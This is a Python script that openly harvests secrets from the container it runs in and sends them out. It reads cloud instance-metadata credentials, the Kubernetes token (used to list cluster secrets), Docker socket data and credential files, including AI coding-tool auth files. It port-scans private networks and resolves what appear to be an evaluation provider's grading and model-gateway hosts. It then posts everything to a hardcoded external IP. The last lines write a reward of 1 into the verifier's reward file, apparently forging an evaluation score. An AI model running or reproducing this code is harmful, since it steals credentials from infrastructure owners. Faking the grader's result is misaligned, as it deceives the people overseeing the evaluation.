#!/usr/bin/env python3
"""Runtime vantage probe: cloud metadata, k8s/SA tokens, docker.sock, host mounts,
private-network discovery, then exfil to the canary. Bounded runtime."""
import os, sys, json, socket, base64, time, glob, ssl, subprocess, urllib.request, urllib.error
from concurrent.futures import ThreadPoolExecutor

CANARY = os.environ.get("I220_CANARY", "http://109.238.87.4:18077/i220")
OUTDIR = "/logs/verifier"
R = {"ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())}


def add(k, v):
    R[k] = v


def readf(path, n=200000):
    try:
        with open(path, "rb") as f:
            return f.read(n).decode("utf-8", "replace")
    except Exception as e:
        return "ERR:%s:%s" % (type(e).__name__, e)


def http(url, method="GET", headers=None, data=None, timeout=3.0, unixsock=None):
    try:
        req = urllib.request.Request(url, data=data, method=method)
        for k, v in (headers or {}).items():
            req.add_header(k, v)
        ctx = None
        if url.startswith("https"):
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            return {"status": r.status, "headers": dict(r.headers), "body": r.read(200000).decode("utf-8", "replace")}
    except urllib.error.HTTPError as e:
        try:
            b = e.read(200000).decode("utf-8", "replace")
        except Exception:
            b = ""
        return {"status": e.code, "headers": dict(e.headers or {}), "body": b}
    except Exception as e:
        return {"error": "%s: %s" % (type(e).__name__, e)}


def unix_http(path, urlpath="/version", method="GET", timeout=2.0):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect(path)
        req = "%s %s HTTP/1.0\r\nHost: docker\r\n\r\n" % (method, urlpath)
        s.sendall(req.encode())
        data = b""
        while True:
            c = s.recv(65536)
            if not c:
                break
            data += c
            if len(data) > 400000:
                break
        s.close()
        return data.decode("utf-8", "replace")[:400000]
    except Exception as e:
        return "ERR:%s: %s" % (type(e).__name__, e)


# ---------- 1. identity / env ----------
add("hostname", socket.gethostname())
add("uname", readf("/proc/version").strip())
add("id", (lambda: (os.getuid(), os.getgid()))())
add("cwd", os.getcwd())
add("self_environ", dict(os.environ))
add("pid1_environ", readf("/proc/1/environ").replace("\x00", "\n"))
add("pid1_cmdline", readf("/proc/1/cmdline").replace("\x00", " "))
add("hostname_file", readf("/etc/hostname"))
add("hosts", readf("/etc/hosts"))
add("resolv", readf("/etc/resolv.conf"))
add("cgroup", readf("/proc/1/cgroup"))
add("mountinfo", readf("/proc/self/mountinfo"))
for p in ["/sys/class/dmi/id/product_name", "/sys/class/dmi/id/sys_vendor",
          "/sys/class/dmi/id/board_vendor", "/sys/class/dmi/id/board_name",
          "/sys/class/dmi/id/bios_vendor", "/sys/class/dmi/id/chassis_vendor"]:
    add("dmi:" + p, readf(p).strip())
add("proc_1_status", readf("/proc/1/status")[:4000])
try:
    add("cpus", os.cpu_count())
except Exception:
    pass

# ---------- 2. cloud metadata ----------
md = {}
# AWS IMDSv2
tk = http("http://169.254.169.254/latest/api/token", method="PUT",
          headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"}, timeout=2.5)
md["aws_token"] = tk
tok = None
if isinstance(tk, dict) and tk.get("status") == 200:
    tok = tk.get("body", "").strip()
hdrs = {"X-aws-ec2-metadata-token": tok} if tok else {}
for p in ["/latest/meta-data/instance-id", "/latest/meta-data/iam/security-credentials/",
          "/latest/meta-data/placement/region", "/latest/dynamic/instance-identity/document",
          "/latest/meta-data/local-ipv4", "/latest/meta-data/public-ipv4",
          "/latest/meta-data/mac", "/latest/meta-data/network/interfaces/macs/"]:
    md["aws" + p] = http("http://169.254.169.254" + p, headers=hdrs, timeout=2.5)
# try role names
role = md.get("aws/latest/meta-data/iam/security-credentials/", {})
if isinstance(role, dict) and role.get("status") == 200:
    for rn in role.get("body", "").split():
        md["aws_creds:" + rn] = http("http://169.254.169.254/latest/meta-data/iam/security-credentials/" + rn.strip(), headers=hdrs, timeout=2.5)
# ECS
for ev in ["AWS_CONTAINER_CREDENTIALS_RELATIVE_URI", "AWS_CONTAINER_CREDENTIALS_FULL_URI",
           "AWS_CONTAINER_AUTHORIZATION_TOKEN", "AWS_EC2_METADATA_DISABLED"]:
    add("env_" + ev, os.environ.get(ev))
rel = os.environ.get("AWS_CONTAINER_CREDENTIALS_RELATIVE_URI")
if rel:
    md["ecs_creds"] = http("http://169.254.170.2" + rel, timeout=2.5)
# GCP
for host in ["metadata.google.internal", "169.254.169.254"]:
    for p in ["/computeMetadata/v1/project/project-id", "/computeMetadata/v1/instance/service-accounts/",
              "/computeMetadata/v1/instance/service-accounts/default/token",
              "/computeMetadata/v1/instance/attributes/?recursive=true",
              "/computeMetadata/v1/instance/zone", "/computeMetadata/v1/instance/name"]:
        md["gcp:%s%s" % (host, p)] = http("http://" + host + p, headers={"Metadata-Flavor": "Google"}, timeout=2.5)
# Azure
md["azure_msi"] = http("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", headers={"Metadata": "true"}, timeout=2.5)
md["azure_instance"] = http("http://169.254.169.254/metadata/instance?api-version=2021-02-01", headers={"Metadata": "true"}, timeout=2.5)
add("metadata", md)

# ---------- 3. kubernetes / SA ----------
k8s = {}
sadir = "/var/run/secrets/kubernetes.io/serviceaccount"
for f in ["token", "namespace", "ca.crt"]:
    k8s[f] = readf(os.path.join(sadir, f))
tkv = k8s.get("token") or ""
if tkv and tkv.count(".") == 2:
    try:
        pl = tkv.split(".")[1]
        pl += "=" * (-len(pl) % 4)
        k8s["jwt_claims"] = json.loads(base64.urlsafe_b64decode(pl))
    except Exception as e:
        k8s["jwt_claims_err"] = str(e)
if os.environ.get("KUBERNETES_SERVICE_HOST"):
    host = os.environ["KUBERNETES_SERVICE_HOST"]; port = os.environ.get("KUBERNETES_SERVICE_PORT", "443")
    k8s["api"] = http("https://%s:%s/api/v1/namespaces/%s/secrets" % (host, port, k8s.get("namespace", "default").strip()),
                      headers={"Authorization": "Bearer " + tkv}, timeout=3)
add("k8s", k8s)

# ---------- 4. docker / containerd ----------
dk = {}
for p in ["/var/run/docker.sock", "/run/docker.sock", "/run/containerd/containerd.sock", "/var/run/containerd/containerd.sock", "/run/podman/podman.sock"]:
    dk["exists:" + p] = os.path.exists(p)
    if os.path.exists(p) and "docker.sock" in p:
        dk["version:" + p] = unix_http(p, "/version")
        dk["containers:" + p] = unix_http(p, "/containers/json?all=1")
        dk["info:" + p] = unix_http(p, "/info")
add("docker", dk)

# ---------- 5. credentials on disk ----------
files = {}
cands = ["/root/.aws/credentials", "/root/.aws/config", "/root/.config/gcloud/application_default_credentials.json",
         "/root/.docker/config.json", "/root/.netrc", "/root/.git-credentials", "/root/.modal.toml",
         "/root/.config/modal.toml", "/etc/kubernetes/admin.conf", "/etc/kubernetes/kubelet.conf",
         "/var/lib/kubelet/kubeconfig", "/root/.kube/config", "/etc/environment", "/root/.claude.json",
         "/root/.codex/auth.json", "/root/.codex/config.toml", "/root/.config/claude/config.json",
         "/root/.bash_history", "/app/.env", "/app/.env.local"]
for f in cands:
    if os.path.exists(f):
        files[f] = readf(f)
for f in glob.glob("/run/secrets/*") + glob.glob("/var/run/secrets/*") + glob.glob("/root/.config/*/application_default_credentials.json"):
    if os.path.isfile(f):
        files[f] = readf(f)
add("cred_files", files)
add("ls_root", readf("/root") and [x for x in os.listdir("/root")] if os.path.isdir("/root") else "no")
for d in ["/", "/app", "/opt", "/mnt", "/host", "/var/run", "/var/run/secrets", "/logs", "/tests", "/solution"]:
    try:
        add("ls:" + d, sorted(os.listdir(d))[:200])
    except Exception as e:
        add("ls:%s" % d, "ERR:%s" % e)

# ---------- 6. network ----------
net = {}
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect(("8.8.8.8", 53)); net["local_ip"] = s.getsockname()[0]; s.close()
except Exception as e:
    net["local_ip"] = "ERR:%s" % e
net["route"] = readf("/proc/net/route")
net["fib_trie"] = readf("/proc/net/fib_trie")[:20000]
try:
    net["getaddrinfo_hostname"] = socket.getaddrinfo(socket.gethostname(), None)
except Exception as e:
    net["getaddrinfo_hostname"] = str(e)
# gateway from /proc/net/route
gw = None
try:
    for line in net["route"].splitlines()[1:]:
        f = line.split()
        if len(f) > 2 and f[1] == "00000000":
            gw = socket.inet_ntoa(bytes.fromhex(f[2])[::-1]); break
except Exception:
    pass
net["gateway"] = gw
names = ["litellm.studio.mercor.com", "litellm.dev.studio.mercor.com", "llm-api.mercor.com",
         "grading.mercor.com", "api.mercor.com", "work.mercor.com", "litellm", "grading",
         "grading-server", "llm-gateway", "gateway", "redis", "postgres", "db", "supabase",
         "minio", "kubernetes.default.svc", "host.docker.internal", "gateway.docker.internal",
         "metadata.google.internal", "firewall.mercor.com", "studio.mercor.com"]
dns = {}
for n in names:
    try:
        dns[n] = sorted({x[4][0] for x in socket.getaddrinfo(n, None)})
    except Exception as e:
        dns[n] = "ERR:%s" % e
net["dns"] = dns

# target hosts to port-scan
targets = set()
if net.get("local_ip", "").count(".") == 3:
    pre = net["local_ip"].rsplit(".", 1)[0]
    for i in range(1, 255):
        targets.add("%s.%d" % (pre, i))
if gw:
    targets.add(gw)
for n, ips in dns.items():
    if isinstance(ips, list):
        for ip in ips:
            if ip.startswith(("10.", "172.", "192.168.", "169.254.")) and not ip.startswith("169.254.169."):
                targets.add(ip)
targets |= {"172.17.0.1", "172.18.0.1", "10.0.0.1", "10.0.1.1", "10.4.0.1", "10.4.1.1"}
ports = [80, 443, 3000, 4000, 4001, 5000, 5432, 6379, 8000, 8001, 8080, 8081, 8082, 8083,
         8088, 8500, 8200, 9090, 9091, 11434, 2375, 2376, 8888, 9000, 27017, 16686, 4317]
open_ports = {}


def check(ip):
    res = []
    for p in ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.4)
        try:
            if s.connect_ex((ip, p)) == 0:
                res.append(p)
        except Exception:
            pass
        finally:
            s.close()
    return (ip, res)


t0 = time.time()
with ThreadPoolExecutor(max_workers=256) as ex:
    for ip, res in ex.map(check, sorted(targets)):
        if res:
            open_ports[ip] = res
        if time.time() - t0 > 120:
            break
net["scanned_hosts"] = len(targets)
net["open_ports"] = open_ports
# fingerprint open HTTP ports
fp = {}
for ip, ps in open_ports.items():
    for p in ps:
        if p in (80, 443, 3000, 4000, 4001, 5000, 8000, 8001, 8080, 8081, 8082, 8083, 8088, 8500, 9090, 9091, 11434, 8888, 9000, 16686):
            scheme = "https" if p in (443,) else "http"
            for path in ["/", "/health", "/v1/models", "/model/info"]:
                fp["%s://%s:%d%s" % (scheme, ip, p, path)] = http("%s://%s:%d%s" % (scheme, ip, p, path), timeout=2)
add("network", net)
add("http_fingerprints", fp)

# ---------- 7. persist + exfil ----------
try:
    os.makedirs(OUTDIR, exist_ok=True)
except Exception:
    pass
blob = json.dumps(R)
for p in [OUTDIR + "/i220_report.json", "/tmp/i220_report.json", "/app/i220_report.json"]:
    try:
        with open(p, "w") as f:
            f.write(blob)
    except Exception:
        pass

print("REPORT_BYTES", len(blob), flush=True)
try:
    print(blob[:6000], flush=True)
except Exception:
    pass

sent = []
# chunked POST
CH = 200000
n = max(1, (len(blob) + CH - 1) // CH)
for i in range(n):
    part = blob[i * CH:(i + 1) * CH]
    ok = False
    for attempt in range(3):
        r = http(CANARY + ("?part=%d&of=%d" % (i, n) if n > 1 else ""),
                 method="POST", headers={"Content-Type": "application/json", "X-I220-Part": str(i)},
                 data=part.encode(), timeout=6)
        if isinstance(r, dict) and r.get("status") == 200:
            ok = True
            break
        time.sleep(1)
    sent.append((i, ok))
# GET fallback small chunk
if not all(x[1] for x in sent):
    try:
        b64 = base64.b64encode(blob[:1200].encode()).decode()
        http(CANARY + "/get?d=" + b64, timeout=5)
    except Exception:
        pass
print("EXFIL", sent, flush=True)
with open(OUTDIR + "/reward.txt", "w") as f:
    f.write("1\n")
